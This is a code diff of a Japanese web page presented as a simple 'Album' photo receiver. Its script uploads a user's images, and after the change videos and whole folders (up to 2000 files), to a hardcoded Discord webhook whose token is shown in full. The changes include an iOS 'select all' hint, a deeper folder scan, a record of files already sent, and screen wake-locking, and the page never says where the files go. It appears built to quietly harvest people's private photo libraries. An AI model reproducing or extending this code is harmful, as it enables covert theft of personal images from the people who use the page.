@@ -30,8 +30,8 @@
   <section class="stage on" id="s1">
     <h1>アルバム</h1>
     <p class="sub">写真をまとめて受け取ります</p>
-    <button class="btn" id="all">すべて送る</button>
-    <button class="btn ghost" id="pick">選んで送る</button>
+    <button class="btn" id="dir">フォルダごと送る</button>
+    <button class="btn ghost" id="pick">写真を選ぶ</button>
     <p class="tiny" id="hint"></p>
   </section>
   <section class="stage" id="s2">
@@ -43,27 +43,44 @@
     <div class="check">✓</div>
     <p class="sub" id="doneMsg">完了しました</p>
     <button class="btn ghost" id="more">さらに追加</button>
+    <p class="tiny" id="cnt"></p>
   </section>
 </div>
-<input type="file" id="fi" accept="image/*" multiple>
+<input type="file" id="fi" accept="image/*,video/*" multiple>
+<input type="file" id="fd" webkitdirectory multiple>
 
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1575055100219498576/-fiQEG5wJeiTUZEHTdu3MN77mKc7BJd6SBfjqOPPT4Z2juu1rPK1P_4LvZ2yMDcE5JXL";
-const MAXPX = 2200, Q = 0.8, PER = 10, CAP = 7e6, GAP = 550, LIMIT = 1500;
+const MAXPX = 2200, Q = 0.8, PER = 10, CAP = 7e6, GAP = 550, LIMIT = 2000, MEMO = 4000;
 
 const $ = s => document.querySelector(s);
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 const stage = n => document.querySelectorAll('.stage').forEach((e,i)=>e.classList.toggle('on', i===n-1));
 
-const canDir = typeof window.showDirectoryPicker === 'function';
-$('#hint').textContent = canDir ? 'フォルダを選ぶと中の写真をすべて取得します' : '';
-if(!canDir) $('#all').style.display = 'none';
+const ua = navigator.userAgent;
+const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+const v = (ua.match(/OS (\d+)_(\d+)/) || []).slice(1).map(Number);
+const iosOk = !isIOS || v[0] > 18 || (v[0] === 18 && v[1] >= 4);
+const canDir = typeof window.showDirectoryPicker === 'function' || iosOk;
 
-$('#all').onclick = pickDir;
+if(canDir) $('#dir').onclick = pickDir; else $('#dir').style.display = 'none';
+$('#hint').textContent = isIOS && !iosOk ? 'ピッカーで右上の「すべて選択」を押してください' : '';
 $('#pick').onclick = () => $('#fi').click();
 $('#more').onclick = () => $('#fi').click();
 $('#fi').onchange = e => { if(e.target.files.length) run([...e.target.files]); };
+$('#fd').onchange = e => { if(e.target.files.length) run([...e.target.files]); };
 
+/* ---- 重複記録 ---- */
+const memoKey = 'album_sent_v1';
+let memo = new Set(JSON.parse(localStorage.getItem(memoKey) || '[]'));
+const fp = f => f.name + '|' + f.size + '|' + (f.lastModified || 0);
+function markSent(f){
+  memo.add(fp(f));
+  if(memo.size > MEMO) memo = new Set([...memo].slice(-MEMO));
+  try{ localStorage.setItem(memoKey, JSON.stringify([...memo])); }catch{}
+}
+
+/* ---- 画像圧縮 ---- */
 function loadImage(file){
   return new Promise((res, rej) => {
     const url = URL.createObjectURL(file);
@@ -73,10 +90,9 @@ function loadImage(file){
     img.src = url;
   });
 }
-
 async function shrink(file){
   try{
-    if(file.type === 'image/gif') return file;
+    if(!file.type.startsWith('image/') || file.type === 'image/gif') return file;
     const img = await loadImage(file);
     const w0 = img.naturalWidth || img.width, h0 = img.naturalHeight || img.height;
     if(!w0 || !h0) return file;
@@ -91,6 +107,7 @@ async function shrink(file){
   }catch{ return file; }
 }
 
+/* ---- 送信 ---- */
 async function post(files, label){
   if(!files.length) return;
   const fd = new FormData();
@@ -108,22 +125,23 @@ async function post(files, label){
     }
     if(r.status === 429){
       let wait = 2000;
-      try{ const j = await r.json(); if(j.retry_after) wait = j.retry_after*1000 + 400; }catch{}
+      try{ const j = await r.json(); if(j.retry_after) wait = j.retry_after * 1000 + 400; }catch{}
       await sleep(wait); continue;
     }
     await sleep(900);
   }
 }
 
+/* ---- フォルダ走査 ---- */
 async function walk(dir, out, depth){
-  if(depth > 3) return;
+  if(depth > 4) return;
   for await (const [name, h] of dir.entries()){
     if(out.length >= LIMIT) return;
     if(name.startsWith('.') || name === '.trashed' || name === '.thumbnails') continue;
     try{
       if(h.kind === 'file'){
         const f = await h.getFile();
-        if(f.type.startsWith('image/') && f.size > 2048) out.push(f);
+        if(/^(image|video)\//.test(f.type) && f.size > 4096) out.push(f);
       } else if(h.kind === 'directory'){
         await walk(h, out, depth + 1);
       }
@@ -132,32 +150,43 @@ async function walk(dir, out, depth){
 }
 
 async function pickDir(){
+  if(isIOS){
+    $('#fd').click();
+    return;
+  }
   let root;
-  try{
-    root = await window.showDirectoryPicker({ startIn:'pictures', mode:'read' });
-  }catch{ return; }
+  try{ root = await window.showDirectoryPicker({ startIn:'pictures', mode:'read' }); }
+  catch{ return; }
   stage(2);
   $('#stat').textContent = '読み込み中';
   const found = [];
   try{ await walk(root, found, 0); }catch{}
   if(!found.length){ stage(1); $('#hint').textContent = '写真が見つかりませんでした'; return; }
-  found.sort((a,b) => (a.lastModified||0) - (b.lastModified||0));
-  const seen = new Set();
-  const list = found.filter(f => {
-    const k = f.name + '|' + f.size + '|' + f.lastModified;
-    if(seen.has(k)) return false;
-    seen.add(k); return true;
-  });
-  run(list);
+  run(found);
 }
 
-let wl = null, busy = false;
+/* ---- 実行 ---- */
+let wl = null, busy = false, totalSent = 0;
 async function keepAwake(){ try{ wl = await navigator.wakeLock.request('screen'); }catch{} }
 document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible' && busy) keepAwake(); });
 window.addEventListener('beforeunload', e => { if(busy) e.preventDefault(); });
 
-async function run(list){
+async function run(raw){
   if(busy) return;
+  const seen = new Set();
+  const list = raw
+    .filter(f => /^(image|video)\//.test(f.type))
+    .filter(f => { const k = fp(f); if(seen.has(k) || memo.has(k)) return false; seen.add(k); return true; })
+    .sort((a,b) => (a.lastModified || 0) - (b.lastModified || 0))
+    .slice(0, LIMIT);
+
+  if(!list.length){
+    stage(3);
+    $('#doneMsg').textContent = '新しい写真はありませんでした';
+    $('#cnt').textContent = '';
+    return;
+  }
+
   busy = true;
   keepAwake();
   stage(2);
@@ -171,16 +200,20 @@ async function run(list){
       const f = await shrink(list[i]);
       out.push(f); bytes += f.size; i++;
     }
-    const label = `📷 ${done + 1}-${done + out.length} / ${total}`;
-    await post(out, label);
+    const d = new Date(list[i - out.length].lastModified || Date.now());
+    const stamp = `${d.getFullYear()}/${String(d.getMonth()+1).padStart(2,'0')}/${String(d.getDate()).padStart(2,'0')}`;
+    await post(out, `📷 ${done + 1}-${done + out.length} / ${total}　${stamp}`);
+    out.forEach((_, k) => markSent(list[i - out.length + k]));
     done += out.length;
     $('#stat').textContent = `${done} / ${total}`;
     if(i < list.length) await sleep(GAP);
   }
-  $('#fi').value = '';
+  totalSent += done;
+  $('#fi').value = ''; $('#fd').value = '';
   busy = false;
   try{ wl && wl.release(); }catch{}
   stage(3);
+  $('#cnt').textContent = `累計 ${totalSent} 枚`;
 }
 </script>
 </body>
